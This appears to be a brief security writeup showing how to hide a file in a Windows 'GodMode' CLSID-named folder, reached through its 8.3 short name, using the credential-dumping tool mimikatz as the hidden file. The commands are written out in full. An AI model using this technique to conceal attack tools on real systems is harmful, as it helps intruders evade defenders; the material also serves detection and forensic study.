1.create file

```
md test.{1D2680C9-0E2A-469d-B787-065558BC7D43}
```

2.Get the short name

![Alt text](https://raw.githubusercontent.com/3gstudent/Writeup/master/pic/Use%20Windows-s%20-GodMode-%20to%20hide%20file/1-1.png)

The short name is `TEST~1.{1D`

3.Copy file

```
copy mimikatz.exe .\TEST~1.{1D\newmimikatz.exe
```

4.Find the file

```
dir c:\ /s /b | find "newmimikatz.exe"
```

![Alt text](https://raw.githubusercontent.com/3gstudent/Writeup/master/pic/Use%20Windows-s%20-GodMode-%20to%20hide%20file/1-1.png)

The path is `c:\test\test.{1D2680C9-0E2A-469d-B787-065558BC7D43}\newmimikatz.exe`

But we can't find it by the following:

![Alt text](https://raw.githubusercontent.com/3gstudent/Writeup/master/pic/Use%20Windows-s%20-GodMode-%20to%20hide%20file/1-3.png)

